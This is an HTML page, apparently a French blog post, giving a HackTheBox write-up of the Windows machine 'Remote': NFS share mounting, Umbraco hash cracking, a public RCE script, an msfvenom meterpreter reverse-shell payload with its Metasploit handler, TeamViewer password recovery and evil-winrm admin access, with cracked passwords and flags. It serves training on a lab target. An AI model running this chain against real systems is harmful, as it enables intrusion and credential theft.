@@ -1,0 +1,1580 @@
+<!DOCTYPE HTML>
+
+<html>
+    <head>
+        <script type="application/ld+json">
+    {
+        "@context" : "http://schema.org",
+        "@type" : "BlogPosting",
+        "mainEntityOfPage": {
+             "@type": "WebPage",
+             "@id": "\/"
+        },
+        "articleSection" : "blog-fr",
+        "name" : "Remote",
+        "headline" : "Remote",
+        "description" : "HackTheBox - Remote",
+        "inLanguage" : "en",
+        "author" : "",
+        "creator" : "",
+        "publisher": "",
+        "accountablePerson" : "",
+        "copyrightHolder" : "",
+        "copyrightYear" : "2020",
+        "datePublished": "2020-08-02 00:00:00 \x2b0000 UTC",
+        "dateModified" : "2020-08-02 00:00:00 \x2b0000 UTC",
+        "url" : "\/blog-fr\/hackthebox\/remote\/",
+        "wordCount" : "709",
+        "keywords" : [ "Blog" ]
+    }
+    </script>
+        
+            
+                <title>Remote</title>
+            
+        
+
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta name="generator" content="Hugo 0.68.3" />
+        
+
+
+        
+            <meta name="author" content="AlrikRr">
+        
+        
+            <meta name="description" content="HackTheBox - Remote">
+        
+
+        <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Remote"/>
+<meta name="twitter:description" content="HackTheBox - Remote"/>
+<meta name="twitter:site" content="@AlrikRr"/>
+
+        <meta property="og:title" content="Remote" />
+<meta property="og:description" content="HackTheBox - Remote" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/blog-fr/hackthebox/remote/" />
+<meta property="article:published_time" content="2020-08-02T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-08-02T00:00:00+00:00" />
+
+        <meta property="og:image" content="//images/logo.png">
+        <meta property="og:image:type" content="image/png">
+        <meta property="og:image:width" content="512">
+        <meta property="og:image:height" content="512">
+        <meta itemprop="name" content="Remote">
+<meta itemprop="description" content="HackTheBox - Remote">
+<meta itemprop="datePublished" content="2020-08-02T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-08-02T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="709">
+
+
+
+<meta itemprop="keywords" content="" />
+        
+
+        
+            
+        
+
+        
+        
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+            <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:400,800,900|Source+Sans+Pro:400,700">
+            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.css">
+            <link rel="stylesheet" href="/css/main.css">
+            <link rel="stylesheet" href="/css/add-on.css">
+            <link rel="stylesheet" href="/css/academicons.min.css">
+	    <link disabled id="dark-mode-theme" rel="stylesheet" href="/css/dark.css">
+        
+
+        
+            
+                
+            
+        
+
+
+  
+    
+    <link href='//cdn.bootcss.com/highlight.js/9.11.0/styles/github.min.css' rel='stylesheet' type='text/css' />
+  
+
+
+      
+    </head>
+    <body>
+
+      
+      <div id="wrapper">
+
+    
+    
+<header id="header">
+    
+      <h1><a href="/">blog-fr</a></h1>
+    
+
+    <nav class="links">
+        <ul>
+            
+                <li>
+                    <a href="/blog-fr/">
+                            <i class="">&nbsp;</i>🇫🇷 Blog
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/blog-en/">
+                            <i class="">&nbsp;</i>🇬🇧 Blog
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/projects/">
+                            <i class="fa fa-list">&nbsp;</i>Projects
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/categories/">
+                            <i class="fa fa-folder">&nbsp;</i>Categories
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/about/">
+                            <i class="">&nbsp;</i>👺 My resume
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="https://www.levulgarisateurnumerique.com/">
+                            <i class="">&nbsp;</i>🦊 LeVulgaNum ⇢
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="https://secforall.org/">
+                            <i class="">&nbsp;</i>🕵️ SecForAll ⇢
+                    </a>
+                </li>
+            
+        </ul>
+    </nav>
+    <nav class="main">
+        <ul>
+            
+            <li id="share-nav" class="share-menu" style="display:none;">
+                <a class="fa-share-alt" href="#share-menu">Share</a>
+            </li>
+            
+            <li>
+	 <a id="dark-mode-toggle" class="fal fa-moon-o">Dark Mode</a>
+            </li>
+            <li class="menu">
+                <a class="fa-bars" href="#menu">Menu</a>
+            </li>
+        </ul>
+    </nav>
+
+	<script>
+var toggle = document.getElementById("dark-mode-toggle");
+var darkTheme = document.getElementById("dark-mode-theme");
+var savedTheme = localStorage.getItem("dark-mode-storage") || "light";
+setTheme(savedTheme);
+
+toggle.addEventListener("click", () => {
+    if (toggle.className === "fal fa-moon-o") {
+        setTheme("dark");
+    } else if (toggle.className === "fal fa-sun-o") {
+        setTheme("light");
+    }
+});
+
+function setTheme(mode) {
+	    localStorage.setItem("dark-mode-storage", mode);
+    if (mode === "dark") {
+        darkTheme.disabled = false;
+        toggle.className = "fal fa-sun-o";
+    } else if (mode === "light") {
+        darkTheme.disabled = true;
+        toggle.className = "fal fa-moon-o";
+    }
+}
+	</script>
+
+</header>
+
+
+<section id="menu">
+
+    
+        <section>
+            <form class="search" method="get" action="//google.com/search">
+                <input type="text" name="q" placeholder="Search" />
+                <input type="hidden" name="as_sitesearch" value="/">
+            </form>
+        </section>
+
+    
+        <section>
+            <ul class="links">
+                
+                    <li>
+                        <a href="/blog-fr/">
+                            <h3>
+                                <i class="">&nbsp;</i>🇫🇷 Blog
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/blog-en/">
+                            <h3>
+                                <i class="">&nbsp;</i>🇬🇧 Blog
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/projects/">
+                            <h3>
+                                <i class="fa fa-list">&nbsp;</i>Projects
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/categories/">
+                            <h3>
+                                <i class="fa fa-folder">&nbsp;</i>Categories
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/about/">
+                            <h3>
+                                <i class="">&nbsp;</i>👺 My resume
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://www.levulgarisateurnumerique.com/">
+                            <h3>
+                                <i class="">&nbsp;</i>🦊 LeVulgaNum ⇢
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://secforall.org/">
+                            <h3>
+                                <i class="">&nbsp;</i>🕵️ SecForAll ⇢
+                            </h3>
+                        </a>
+                    </li>
+                
+            </ul>
+        </section>
+
+    
+        <section class="recent-posts">
+            <div class="mini-posts">
+                <header>
+                    <h3>Recent Posts</h3>
+                </header>
+                
+
+                
+                    
+                
+
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/iot/p4wnp1-rubberducky/">🇫🇷  #2 P4wnP1:ALOA RubberDucky</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-11-18'>
+                                    November 18, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-rubberducky/" class="image featured">
+            <img src="/img//iot/P4-RubberDucky/P4wnP1-rubberducky-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/iot/p4wnp1-installation/">🇫🇷  #1 P4wnP1:ALOA Installation</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-11-11'>
+                                    November 11, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-installation/" class="image featured">
+            <img src="/img//iot/P4/P4wnP1-install-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/binary/6-ret2libc/">🇫🇷  Ret2libc avec protection NX</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-18'>
+                                    September 18, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/6-ret2libc/" class="image featured">
+            <img src="/img//binary/6-ret2lib-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/binary/5-ret2win/">🇫🇷  ROP32 sans protection</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-15'>
+                                    September 15, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/5-ret2win/" class="image featured">
+            <img src="/img//binary/5-ret2win-binary.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/archlinux/arch-postinstall/">🇫🇷  Archlinux Post-Install !</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-14'>
+                                    September 14, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/archlinux/arch-postinstall/" class="image featured">
+            <img src="/img//arch/arch-post/arch-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/binary/4-bufferoverflow/">🇫🇷  BufferOverflow 32bits sans protection</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-12'>
+                                    September 12, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/4-bufferoverflow/" class="image featured">
+            <img src="/img//binary/4-binary-bufferoverflow.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+
+                
+                    <a href=
+                        
+                            /blog/
+                        
+                        class="button">View more posts</a>
+                
+            </div>
+        </section>
+
+    
+        
+</section>
+
+    <section id="share-menu">
+    <section id="social-share-nav">
+        <ul class="links">
+            <header>
+                <h3>Share this post <i class="fa fa-smile-o"></i></h3>
+            </header>
+            
+
+
+
+<li>
+  <a href="//twitter.com/share?url=%2fblog-fr%2fhackthebox%2fremote%2f&amp;text=Remote&amp;via=AlrikRr" target="_blank" class="share-btn twitter">
+    <i class="fa fa-twitter"></i>
+    <p>Twitter</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+<li>
+  <a href="//reddit.com/submit?url=%2fblog-fr%2fhackthebox%2fremote%2f&amp;title=Remote" target="_blank" class="share-btn reddit">
+    <i class="fa fa-reddit-alien"></i>
+    <p>Reddit</p>
+  </a>
+</li>
+
+
+
+
+<li>
+  <a href="//www.linkedin.com/shareArticle?url=%2fblog-fr%2fhackthebox%2fremote%2f&amp;title=Remote" target="_blank" class="share-btn linkedin">
+      <i class="fa fa-linkedin"></i>
+      <p>LinkedIn</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+        </ul>
+    </section>
+</section>
+
+    
+    <div id="main">
+        
+        
+        <article class="post">
+  <header>
+    <div class="title">
+        
+            <h1><a href="/blog-fr/hackthebox/remote/">Remote</a></h1>
+            
+        
+        
+            <p>HackTheBox - Remote</p>
+        
+    </div>
+    <div class="meta">
+        
+
+        <time class="published"
+            datetime='2020-08-02'>
+            August 2, 2020</time>
+        <span class="author">AlrikRr</span>
+        
+            <p>4 minute read</p>
+        
+        
+    </div>
+</header>
+
+
+  
+    <section id="social-share">
+      <ul class="icons">
+        
+
+
+
+<li>
+  <a href="//twitter.com/share?url=%2fblog-fr%2fhackthebox%2fremote%2f&amp;text=Remote&amp;via=AlrikRr" target="_blank" class="share-btn twitter">
+    <i class="fa fa-twitter"></i>
+    <p>Twitter</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+<li>
+  <a href="//reddit.com/submit?url=%2fblog-fr%2fhackthebox%2fremote%2f&amp;title=Remote" target="_blank" class="share-btn reddit">
+    <i class="fa fa-reddit-alien"></i>
+    <p>Reddit</p>
+  </a>
+</li>
+
+
+
+
+<li>
+  <a href="//www.linkedin.com/shareArticle?url=%2fblog-fr%2fhackthebox%2fremote%2f&amp;title=Remote" target="_blank" class="share-btn linkedin">
+      <i class="fa fa-linkedin"></i>
+      <p>LinkedIn</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+      </ul>
+    </section>
+  
+
+  
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/hackthebox/remote/" class="image featured">
+            <img src="/img//writeup/remote/htb-remote.png" alt="">
+        </a>
+    
+
+
+  <div id="content">
+    <p><img src="/img/writeup/remote/remote.png" alt="remote"></p>
+<p>Hello et bienvenue sur mon write-up de la machine remote sur HackTheBox !</p>
+<p>C&rsquo;est ma première machine Windows, j&rsquo;ai fait quelques erreurs mais bon, on est là pour apprendre non ? :)</p>
+<hr>
+<h2 id="tools">Tools</h2>
+<ul>
+<li>Kali linux 2020 + Tous les outils</li>
+<li>Shell : ZSH</li>
+<li>VirtualBox pour Kali-linux</li>
+</ul>
+<hr>
+<h2 id="nmap">NMAP</h2>
+<p>Le classique, un nmap pour voir les ports ouverts sur la machine.</p>
+<p><img src="/img/writeup/remote/nmap.png" alt="nmap"></p>
+<p><img src="/img/writeup/remote/nmap_2.png" alt="nmap_2"></p>
+<h2 id="ftp">FTP</h2>
+<p>Il y a un port FTP avec un accès ANONYMOUS mais celui-ci ne retourne rien d&rsquo;interessant.</p>
+<p><img src="/img/writeup/remote/ftp.png" alt="ftp"></p>
+<h2 id="web-site">Web Site</h2>
+<p>Pour le site web, il sagit d&rsquo;un CMS Umbraco.<br>
+La page de login se trouve ic :</p>
+<ul>
+<li><code>http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms</code></li>
+</ul>
+<h2 id="cve">CVE</h2>
+<p>On va regarder les CVE avec ce CMS.</p>
+<p><img src="/img/writeup/remote/searchploit_umbraco.png" alt="searchploit"></p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">~ ヤマト» msfconsole 
+msf5 &gt; search 19671
+msf5 &gt; use exploit/windows/http/umbraco_upload_aspx
+msf5 exploit(windows/http/umbraco_upload_aspx) &gt; set RHOSTS 10.10.10.180
+msf5 exploit(windows/http/umbraco_upload_aspx) &gt; set LHOST 10.10.14.30
+msf5 exploit(windows/http/umbraco_upload_aspx) &gt; show options
+</code></pre><p><img src="/img/writeup/remote/umbraco_msf.png" alt="msf"></p>
+<p>Mais l&rsquo;exploit ne fonctionne pas.</p>
+<h2 id="nfs">NFS</h2>
+<p>Après avoir fouillé le site web sans rien trouvé, j&rsquo;ai remarqué que sur le NMAP il y avait un port 111 avec un protocol NFS.</p>
+<p>Si les droits sont mal géré sur ce partage, il est possible de le monter sur notre Linux.</p>
+<ul>
+<li><a href="https://docs.datafabric.hpe.com/51/DevelopmentGuide/c-mount-nfs-on-linux.html">https://docs.datafabric.hpe.com/51/DevelopmentGuide/c-mount-nfs-on-linux.html</a></li>
+</ul>
+<p>Et c&rsquo;est le cas :</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">sudo apt-get install nfs-common (Ubuntu)
+~ ヤマト» sudo showmount -e 10.10.10.180
+Export list for 10.10.10.180:
+/site_backups (everyone)
+</code></pre><p>Il y a un dossier <code>/site_backups</code> accéssible à tout le monde.<br>
+Il suffit de le monter.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">HTB/remote ヤマト» mkdir site_backups
+HTB/remote ヤマト» sudo mount -o hard,nolock 10.10.10.180:/site_backups site_backups 
+</code></pre><p><img src="/img/writeup/remote/backup.png" alt="backup"></p>
+<p>On cherchant des info sur Umbraco, j&rsquo;ai vu qu&rsquo;il existait un fichier umbraco.sdf qui sert de &ldquo;database&rdquo; et peut contenir des choses interesssantes.</p>
+<p><code>site_backups/App_Data ヤマト» strings Umbraco.sdf | grep password</code></p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">User &quot;admin&quot; &lt;admin@htb.local&gt;192.168.195.1User &quot;admin&quot; &lt;admin@htb.local&gt;umbraco/user/password/changepassword change
+User &quot;admin&quot; &lt;admin@htb.local&gt;192.168.195.1User &quot;smith&quot; &lt;smith@htb.local&gt;umbraco/user/password/changepassword change
+User &quot;admin&quot; &lt;admin@htb.local&gt;192.168.195.1User &quot;ssmith&quot; &lt;ssmith@htb.local&gt;umbraco/user/password/changepassword change
+User &quot;admin&quot; &lt;admin@htb.local&gt;192.168.195.1User &quot;admin&quot; &lt;admin@htb.local&gt;umbraco/user/password/changepassword change
+User &quot;admin&quot; &lt;admin@htb.local&gt;192.168.195.1User &quot;admin&quot; &lt;admin@htb.local&gt;umbraco/user/password/changepassword change
+</code></pre><p>Il y a l&rsquo;air d&rsquo;y avoir 3 utilisateurs :</p>
+<ul>
+<li>Admin</li>
+<li>smith</li>
+<li>ssmith</li>
+</ul>
+<p>EN faisant un grep sur admin on tombe sur un hash en SHA1.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
+Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
+</code></pre><p>On va essayé de le craquer.
+PS : Les deux autres utilisateurs on un hash en SHA256.</p>
+<p>Admin hash : <code>b8be16afba8c314ad33d812f22a04991b90e2aaa</code></p>
+<p>Utilisons hash-identifier pour être sûr.</p>
+<p><img src="/img/writeup/remote/hash-identifier.png" alt="hash-identifier"></p>
+<p>Pour cracker le hash : <a href="https://sha1.gromweb.com/?hash=b8be16afba8c314ad33d812f22a04991b90e2aaa">https://sha1.gromweb.com/?hash=b8be16afba8c314ad33d812f22a04991b90e2aaa</a></p>
+<p>Le mot de passe est : <code>baconandcheese</code></p>
+<p>La connexion <strong>FTP</strong> ne fonctionne pas avec ce mot de passe.</p>
+<h2 id="connexion">Connexion</h2>
+<p>Pour se connecter au site web, pensez à utiliser l&rsquo;identifiant <strong><a href="mailto:admin@htb.local">admin@htb.local</a></strong> car juste <strong>admin</strong> ne fonctionnera pas !</p>
+<p>Login : <code>admin@htb.local</code>
+Passwd: <code>baconandcheese</code></p>
+<h2 id="exploit-umbraco">Exploit UMBRACO</h2>
+<p>J&rsquo;ai trouvé un exploit pour <strong>umbraco</strong>.<br>
+<a href="https://github.com/noraj/Umbraco-RCE">https://github.com/noraj/Umbraco-RCE</a></p>
+<p><img src="/img/writeup/remote/python3-exploit.png" alt="python"></p>
+<p>Cet exploit permet d&rsquo;executer des commandes <code>CMD</code> à distance avec un compte.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">remote/Umbraco-RCE [master] ヤマト» python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a 'whoami'
+iis apppool\defaultapppool
+</code></pre><p>De cette manière nous allons faire executer un payload afin d&rsquo;avoir accès à un SHELL.</p>
+<p>Premièrement, création du payload.<br>
+<code>sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.30 LPORT=4444 -f exe &gt; yamato.exe</code></p>
+<p>Ensuite, handler avec msf.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">msfconsole
+msf5 &gt; use exploit/multi/handler 
+msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) &gt; set lhost 10.10.14.30
+exploit
+</code></pre><p>Pour finir, il faut trouver un moyen d&rsquo;upload notre payload.exe sur la machine.</p>
+<p>Ca tombe bien, avec umbraco il y a moyen d&rsquo;upload des fichiers depuis le dashboard.</p>
+<p><img src="/img/writeup/remote/upload_1.png" alt="upload_1"></p>
+<p><img src="/img/writeup/remote/upload_2.png" alt="upload_2"></p>
+<p>Au passage, il y a la possibilité de prendre le flag user avec notre exploit python.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">remote/Umbraco-RCE [master] ヤマト» python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a 'type C:/Users/Public/user.txt'
+26e814bae68ca8afa3a413759dcfdfc0
+</code></pre><p>Maintenant il faut que je trouve /media/1033/yamato.exe pour l&rsquo;executer avec notre exploit python.</p>
+<p>Notre <strong>exe</strong> se trouve dans <code>C:/inetpub/wwwroot/media/1033/yamato.exe</code></p>
+<p><img src="/img/writeup/remote/python3-exploit_2.png" alt="python-2"></p>
+<p>Maintenant, il faut l&rsquo;executer avec le script python.</p>
+<p>Voila !</p>
+<p><img src="/img/writeup/remote/msf_exploit.png" alt="msf"></p>
+<h2 id="road-to-root">Road to ROOT</h2>
+<p>Maintenant que nous avons un accès USER assez stable, il faut trouver un moyen d&rsquo;avoir un accès ROOT.</p>
+<p>Premièrement, je vais regarder les Programmes installés sur la machine.</p>
+<p><img src="/img/writeup/remote/dir.png" alt="dir"></p>
+<p>On peut voir qu&rsquo;il y a TeamViewer d&rsquo;installer sur la machine, en version 7.</p>
+<p>C&rsquo;est le moment de trouver un exploit !
+<a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/credentials/teamviewer_passwords.md">https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/credentials/teamviewer_passwords.md</a></p>
+<p>Cet exploit va nous permetre de récupérer le mot de passe administrateur utilisé avec TeamViewer.</p>
+<p><img src="/img/writeup/remote/teamviewer.png" alt="teamviewer"></p>
+<p>Bingo !</p>
+<p>login : <code>Administrator</code>
+pass : <code>!R3m0te!</code></p>
+<p>Maintenant, il nous faut un accès distant avec un compte administrateur.</p>
+<p>Pour ca, rien de plus simple, on va utiliser l&rsquo;outil <strong>evil-winrm</strong>.</p>
+<p><a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></p>
+<p><code>HTB/remote ヤマト» sudo evil-winrm -u Administrator -p '!R3m0te!' -i 10.10.10.180</code></p>
+<p>RE:Bingo on a notre accès ROOT il reste plus qu&rsquo;a récupérer le flag !
+<code>C:/Users/Administrator/Desktop/root.txt</code></p>
+<p>flag:<code>e6637b36871bed4041ce7fa150c22b68</code></p>
+<p>Voila, c'était ma première machine sous Windows !</p>
+
+  </div>
+
+  <footer>
+    <ul class="stats">
+  <li class="categories">
+    <ul>
+        
+            
+            
+                <i class="fa fa-folder"></i>
+                
+                
+                <li><a class="article-category-link" href="/categories/hackthebox">HackTheBox</a></li>
+                
+            
+        
+    </ul>
+  </li>
+  <li class="tags">
+    <ul>
+        
+    </ul>
+  </li>
+</ul>
+
+  </footer>
+
+</article>
+
+
+<ul class="actions pagination">
+    
+        <li><a href="/blog-fr/hackthebox/tabby/"
+                class="button big previous">Tabby</a></li>
+    
+
+    
+        <li><a href="/blog-fr/hackthebox/magic/"
+                class="button big next">Magic</a></li>
+    
+</ul>
+
+
+    </div>
+    
+<section id="sidebar">
+
+  
+  <section id="intro">
+    
+    
+      
+        <a href='/'><img src="/img/main/logo.jpg" class="intro-circle" width="250" alt="AlrikRr" /></a>
+      
+    
+    
+      <header>
+        <h2>Hello, friend.</h2>
+        <p>The greatest enemy of knowledge is not ignorance, it is the illusion of knowledge.</p>
+      </header>
+    
+    
+      <ul class="icons">
+        
+          
+    <li><a href="/index.xml" type="application/rss+xml" target="_blank" title="RSS" class="fa fa-rss"></a></li>
+
+
+        
+        
+  <li><a href="//github.com/AlrikRr" target="_blank" title="GitHub" class="fa fa-github"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//linkedin.com/in/adrien-lasalle" target="_blank" title="LinkedIn" class="fa fa-linkedin"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//reddit.com/user/AlrikRr" target="_blank" title="Reddit" class="fa fa-reddit"></a></li>
+
+
+
+
+
+  <li><a href="//youtube.com/https://www.youtube.com/channel/UCnfAzfzPenSKIRLUCtKA4VA" target="_blank" title="YouTube" class="fa fa-youtube"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//twitter.com/AlrikRr" target="_blank" title="Twitter" class="fa fa-twitter"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      </ul>
+    
+  </section>
+
+  
+  <section class="recent-posts">
+    <div class="mini-posts">
+      <header>
+        <h3>Recent Posts</h3>
+      </header>
+      <div class="posts-container">
+        
+
+        
+          
+        
+
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/iot/p4wnp1-rubberducky/">🇫🇷  #2 P4wnP1:ALOA RubberDucky</a>
+              </h3>
+              
+              <time class="published" datetime='2020-11-18'>
+                November 18, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-rubberducky/" class="image featured">
+            <img src="/img//iot/P4-RubberDucky/P4wnP1-rubberducky-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/iot/p4wnp1-installation/">🇫🇷  #1 P4wnP1:ALOA Installation</a>
+              </h3>
+              
+              <time class="published" datetime='2020-11-11'>
+                November 11, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-installation/" class="image featured">
+            <img src="/img//iot/P4/P4wnP1-install-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/binary/6-ret2libc/">🇫🇷  Ret2libc avec protection NX</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-18'>
+                September 18, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/6-ret2libc/" class="image featured">
+            <img src="/img//binary/6-ret2lib-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/binary/5-ret2win/">🇫🇷  ROP32 sans protection</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-15'>
+                September 15, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/5-ret2win/" class="image featured">
+            <img src="/img//binary/5-ret2win-binary.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/archlinux/arch-postinstall/">🇫🇷  Archlinux Post-Install !</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-14'>
+                September 14, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/archlinux/arch-postinstall/" class="image featured">
+            <img src="/img//arch/arch-post/arch-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/binary/4-bufferoverflow/">🇫🇷  BufferOverflow 32bits sans protection</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-12'>
+                September 12, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/4-bufferoverflow/" class="image featured">
+            <img src="/img//binary/4-binary-bufferoverflow.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+      </div>
+
+      
+        <a href=
+          
+            /blog/
+          
+        class="button">View more posts</a>
+      
+    </div>
+  </section>
+
+  
+  
+  
+  
+  
+    <section id="categories">
+      <header>
+        <h3>
+          <a href="/categories/">Categories</a>
+        </h3>
+      </header>
+        
+          
+        
+
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/hackthebox/">hackthebox</a>
+                <span style="float:right;">6</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/tuto/">tuto</a>
+                <span style="float:right;">6</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/projects/">projects</a>
+                <span style="float:right;">5</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/en-nixos/">en-nixos</a>
+                <span style="float:right;">4</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/fr-nixos/">fr-nixos</a>
+                <span style="float:right;">4</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
